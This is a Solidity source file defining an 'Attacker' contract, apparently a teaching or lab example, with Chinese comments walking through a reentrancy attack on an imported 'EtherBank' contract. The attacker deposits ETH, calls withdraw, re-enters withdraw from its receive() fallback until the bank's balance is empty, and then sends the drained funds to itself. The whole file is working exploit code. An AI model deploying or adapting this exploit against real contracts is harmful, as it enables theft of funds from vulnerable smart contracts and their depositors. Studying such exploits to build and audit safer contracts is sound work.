// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./EtherBank.sol";

contract Attacker {
    EtherBank public etherBank;

    constructor(address _etherBank) {
        etherBank = EtherBank(_etherBank);
    }

    //攻击入口
    function attack() external payable {
        require(msg.value > 0, "Send some ETH to attack");
        //1.存款：把ETH存入银行
        etherBank.deposit{value: msg.value}();

        //2.提款：触发重入攻击
        etherBank.withdraw();
    }

    receive() external payable {
        //3.重入：当银行转账ETH给攻击者时，会触发receive()，再次调用提款函数
        if (etherBank.getBalance() > 0) {
            etherBank.withdraw();
        }
    }

    //转账给攻击者自己
    function collectFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }

}